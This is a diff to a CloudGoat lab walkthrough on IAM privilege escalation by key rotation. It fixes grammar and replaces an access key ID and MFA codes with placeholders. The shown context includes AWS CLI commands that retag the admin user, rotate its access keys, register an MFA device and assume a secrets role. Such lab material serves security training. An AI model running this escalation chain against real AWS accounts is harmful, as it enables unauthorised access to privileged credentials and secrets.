@@ -18,7 +18,7 @@ aws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_<cloudgo
 ```
 
 With the permissions we can tag and change access keys for users with the tag `developer=true`.
-- Looking at the IAM users there is a developer and a admin user.
+- Looking at the IAM users there is a developer and an admin user.
 - The admin user has permissions to assume a role `cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id>` which allows it to retrieve the secret flag.
 
 ```bash
@@ -26,7 +26,7 @@ aws iam tag-user --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --
 
 aws iam list-access-keys --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id>
 
-aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --access-key-id AKIAZ6IIT5XU4BXDZM7B
+aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --access-key-id <ACCESS_KEY_ID>
 
 aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id>
 # {
@@ -65,14 +65,14 @@ Scan the QR code in the file `QRCode.png`. For the following command put in two 
 aws iam enable-mfa-device \
     --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> \
     --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa \
-    --authentication-code1 438582 \
-    --authentication-code2 615656
+    --authentication-code1 <MFA Code #1> \
+    --authentication-code2 <MFA Code #2>
 ```
 
 Now we can assume the role since were using mfa. Switch back to the shell/profile that has the admin users credentials.
 
 ```bash
-aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa --token-code 798934
+aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa --token-code <TOKEN_CODE>
 # {
 #     "Credentials": {
 #         "AccessKeyId": "ASIA...",
